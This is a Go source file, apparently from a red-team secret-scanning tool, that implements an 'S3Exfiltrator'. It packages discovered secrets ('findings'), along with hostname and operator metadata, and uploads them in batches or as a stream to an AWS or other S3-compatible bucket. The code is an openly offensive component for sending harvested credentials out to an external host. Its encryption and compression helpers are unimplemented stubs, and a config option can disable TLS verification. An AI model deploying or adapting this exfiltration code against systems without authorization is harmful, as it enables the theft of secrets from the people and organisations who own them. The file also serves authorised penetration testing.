package s3

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
)

// S3Exfiltrator exfiltrates findings to S3-compatible storage.
//
// Supports:
// - AWS S3
// - MinIO
// - DigitalOcean Spaces
// - Backblaze B2
// - Wasabi
// - Any S3-compatible endpoint
//
// WARNING: Ensure you have authorization before exfiltrating data.
type S3Exfiltrator struct {
	client     *s3.Client
	bucket     string
	prefix     string
	region     string
	config     exfil.Config
	encryptor  Encryptor
	compressor Compressor
}

// Config holds S3-specific configuration.
type Config struct {
	// Bucket is the S3 bucket name
	Bucket string

	// Region is the AWS region (e.g., "us-east-1")
	Region string

	// Endpoint is the S3 endpoint URL (for non-AWS S3)
	// Example: "https://minio.example.com:9000"
	Endpoint string

	// Prefix is the object key prefix
	// Supports templating: "engagements/{{ .Year }}/{{ .Month }}"
	Prefix string

	// Encryption specifies server-side encryption
	// Options: "AES256", "aws:kms"
	Encryption string

	// Compress enables compression before upload
	Compress bool

	// CompressAlgorithm specifies compression algorithm
	// Options: "gzip", "zstd", "none"
	CompressAlgorithm string

	// Credentials configuration
	Credentials CredentialsConfig

	// TLS configuration
	TLS TLSConfig

	// Storage class for S3 objects
	StorageClass string
}

// CredentialsConfig holds S3 credential configuration.
type CredentialsConfig struct {
	// Source specifies where to get credentials
	// Options: "env", "file", "instance_role", "static"
	Source string

	// AccessKeyEnv is the environment variable for access key
	AccessKeyEnv string

	// SecretKeyEnv is the environment variable for secret key
	SecretKeyEnv string

	// AccessKey is the static access key (not recommended)
	AccessKey string

	// SecretKey is the static secret key (not recommended)
	SecretKey string

	// ProfileName is the AWS profile name (for "file" source)
	ProfileName string
}

// TLSConfig holds TLS configuration for S3 connections.
type TLSConfig struct {
	// VerifyTLS controls whether to verify TLS certificates
	VerifyTLS bool

	// CACertPath is the path to CA certificate for custom endpoints
	CACertPath string

	// PinCertificate enables certificate pinning
	PinCertificate bool

	// PinnedCertPath is the path to the pinned certificate
	PinnedCertPath string
}

// Encryptor handles client-side encryption.
type Encryptor interface {
	Encrypt(data []byte) ([]byte, error)
	Decrypt(data []byte) ([]byte, error)
}

// Compressor handles compression.
type Compressor interface {
	Compress(data []byte) ([]byte, error)
	Decompress(data []byte) ([]byte, error)
}

// NewS3Exfiltrator creates a new S3 exfiltrator.
func NewS3Exfiltrator(cfg exfil.Config) (*S3Exfiltrator, error) {
	// Extract S3-specific config from options
	s3Config, err := parseS3Config(cfg.Options)
	if err != nil {
		return nil, fmt.Errorf("invalid s3 config: %w", err)
	}

	// Create AWS config
	awsConfig, err := createAWSConfig(s3Config)
	if err != nil {
		return nil, fmt.Errorf("failed to create aws config: %w", err)
	}

	// Create S3 client
	client := s3.NewFromConfig(awsConfig, func(o *s3.Options) {
		if s3Config.Endpoint != "" {
			o.BaseEndpoint = aws.String(s3Config.Endpoint)
			o.UsePathStyle = true // Required for MinIO and other S3-compatible services
		}
	})

	// Create encryptor if encryption is enabled
	var encryptor Encryptor
	if cfg.Encryption.Enabled {
		encryptor, err = createEncryptor(cfg.Encryption)
		if err != nil {
			return nil, fmt.Errorf("failed to create encryptor: %w", err)
		}
	}

	// Create compressor if compression is enabled
	var compressor Compressor
	if s3Config.Compress {
		compressor, err = createCompressor(s3Config.CompressAlgorithm)
		if err != nil {
			return nil, fmt.Errorf("failed to create compressor: %w", err)
		}
	}

	return &S3Exfiltrator{
		client:     client,
		bucket:     s3Config.Bucket,
		prefix:     s3Config.Prefix,
		region:     s3Config.Region,
		config:     cfg,
		encryptor:  encryptor,
		compressor: compressor,
	}, nil
}

// Exfiltrate uploads findings to S3 in batch mode.
func (e *S3Exfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
	// Filter findings
	filtered := e.filterFindings(findings)
	if len(filtered) == 0 {
		return nil
	}

	// Create package
	pkg := exfil.Package{
		Metadata: e.createMetadata(len(filtered)),
		Findings: filtered,
	}

	// Serialize to JSON
	data, err := json.MarshalIndent(pkg, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal findings: %w", err)
	}

	// Compress if configured
	if e.compressor != nil {
		data, err = e.compressor.Compress(data)
		if err != nil {
			return fmt.Errorf("failed to compress data: %w", err)
		}
	}

	// Encrypt if configured
	if e.encryptor != nil {
		data, err = e.encryptor.Encrypt(data)
		if err != nil {
			return fmt.Errorf("failed to encrypt data: %w", err)
		}
	}

	// Generate object key
	key := e.generateObjectKey()

	// Upload to S3
	_, err = e.client.PutObject(ctx, &s3.PutObjectInput{
		Bucket: aws.String(e.bucket),
		Key:    aws.String(key),
		Body:   bytes.NewReader(data),
	})
	if err != nil {
		return fmt.Errorf("failed to upload to s3: %w", err)
	}

	return nil
}

// ExfiltrateStream uploads findings one at a time as they're discovered.
func (e *S3Exfiltrator) ExfiltrateStream(ctx context.Context, findings <-chan pillager.Finding) error {
	count := 0
	for finding := range findings {
		// Check context cancellation
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Check filters
		if !exfil.ShouldExfiltrate(finding, e.config.Filters) {
			continue
		}

		// Serialize finding
		data, err := json.Marshal(finding)
		if err != nil {
			return fmt.Errorf("failed to marshal finding: %w", err)
		}

		// Encrypt if configured
		if e.encryptor != nil {
			data, err = e.encryptor.Encrypt(data)
			if err != nil {
				return fmt.Errorf("failed to encrypt data: %w", err)
			}
		}

		// Generate unique object key for this finding
		key := fmt.Sprintf("%s/%d-%s.json", e.prefix, time.Now().Unix(), finding.Description)

		// Upload to S3
		_, err = e.client.PutObject(ctx, &s3.PutObjectInput{
			Bucket: aws.String(e.bucket),
			Key:    aws.String(key),
			Body:   bytes.NewReader(data),
		})
		if err != nil {
			return fmt.Errorf("failed to upload finding to s3: %w", err)
		}

		count++
		if e.config.Filters.MaxFindings > 0 && count >= e.config.Filters.MaxFindings {
			break
		}
	}

	return nil
}

// Health checks if the S3 bucket is accessible.
func (e *S3Exfiltrator) Health(ctx context.Context) error {
	// Try to head the bucket
	_, err := e.client.HeadBucket(ctx, &s3.HeadBucketInput{
		Bucket: aws.String(e.bucket),
	})
	if err != nil {
		return fmt.Errorf("s3 bucket not accessible: %w", err)
	}

	return nil
}

// Close cleanly shuts down the exfiltrator.
func (e *S3Exfiltrator) Close() error {
	// No cleanup needed for S3 client
	return nil
}

// filterFindings filters findings based on configuration.
func (e *S3Exfiltrator) filterFindings(findings []pillager.Finding) []pillager.Finding {
	filtered := make([]pillager.Finding, 0)
	for _, finding := range findings {
		if exfil.ShouldExfiltrate(finding, e.config.Filters) {
			filtered = append(filtered, finding)
			if e.config.Filters.MaxFindings > 0 && len(filtered) >= e.config.Filters.MaxFindings {
				break
			}
		}
	}
	return filtered
}

// createMetadata creates metadata for the findings package.
func (e *S3Exfiltrator) createMetadata(findingCount int) exfil.Metadata {
	metadata := exfil.Metadata{
		Timestamp:    time.Now(),
		Version:      "2.0.0",
		FindingCount: findingCount,
	}

	if e.config.Metadata.IncludeHostname {
		hostname, _ := os.Hostname()
		metadata.Hostname = hostname
	}

	if e.config.Metadata.IncludeEngagement {
		metadata.EngagementID = e.config.Metadata.EngagementID
		metadata.OperatorID = e.config.Metadata.OperatorID
	}

	if len(e.config.Metadata.CustomTags) > 0 {
		metadata.CustomTags = e.config.Metadata.CustomTags
	}

	return metadata
}

// generateObjectKey generates an S3 object key for the findings.
func (e *S3Exfiltrator) generateObjectKey() string {
	timestamp := time.Now().Format("2006-01-02T15-04-05Z")
	return fmt.Sprintf("%s/%s/findings.json", e.prefix, timestamp)
}

// parseS3Config extracts S3 configuration from generic options map.
func parseS3Config(options map[string]interface{}) (Config, error) {
	// This is a placeholder - in real implementation, we'd use mapstructure or similar
	cfg := Config{}

	if bucket, ok := options["bucket"].(string); ok {
		cfg.Bucket = bucket
	}

	if region, ok := options["region"].(string); ok {
		cfg.Region = region
	}

	if endpoint, ok := options["endpoint"].(string); ok {
		cfg.Endpoint = endpoint
	}

	if prefix, ok := options["prefix"].(string); ok {
		cfg.Prefix = prefix
	}

	return cfg, nil
}

// createAWSConfig creates AWS SDK configuration.
func createAWSConfig(s3Config Config) (aws.Config, error) {
	// Load default config
	cfg, err := config.LoadDefaultConfig(context.Background(),
		config.WithRegion(s3Config.Region),
	)
	if err != nil {
		return aws.Config{}, err
	}

	// Override credentials if static credentials are provided
	if s3Config.Credentials.Source == "static" {
		cfg.Credentials = credentials.NewStaticCredentialsProvider(
			s3Config.Credentials.AccessKey,
			s3Config.Credentials.SecretKey,
			"",
		)
	}

	// Configure custom HTTP client for TLS settings
	if s3Config.TLS.CACertPath != "" || s3Config.TLS.PinCertificate {
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: !s3Config.TLS.VerifyTLS,
			},
		}

		// Load CA certificate if provided
		if s3Config.TLS.CACertPath != "" {
			caCert, err := os.ReadFile(s3Config.TLS.CACertPath)
			if err != nil {
				return aws.Config{}, fmt.Errorf("failed to read CA cert: %w", err)
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(caCert)
			transport.TLSClientConfig.RootCAs = caCertPool
		}

		cfg.HTTPClient = &http.Client{
			Transport: transport,
		}
	}

	return cfg, nil
}

// createEncryptor creates an encryptor based on configuration.
func createEncryptor(cfg exfil.EncryptionConfig) (Encryptor, error) {
	// Placeholder - would implement AES256, ChaCha20, etc.
	return nil, fmt.Errorf("encryption not yet implemented")
}

// createCompressor creates a compressor based on algorithm.
func createCompressor(algorithm string) (Compressor, error) {
	// Placeholder - would implement gzip, zstd, etc.
	return nil, fmt.Errorf("compression not yet implemented")
}

// init registers the S3 exfiltrator with the default registry.
func init() {
	exfil.DefaultRegistry.Register("s3", func(cfg exfil.Config) (exfil.Exfiltrator, error) {
		return NewS3Exfiltrator(cfg)
	})
}
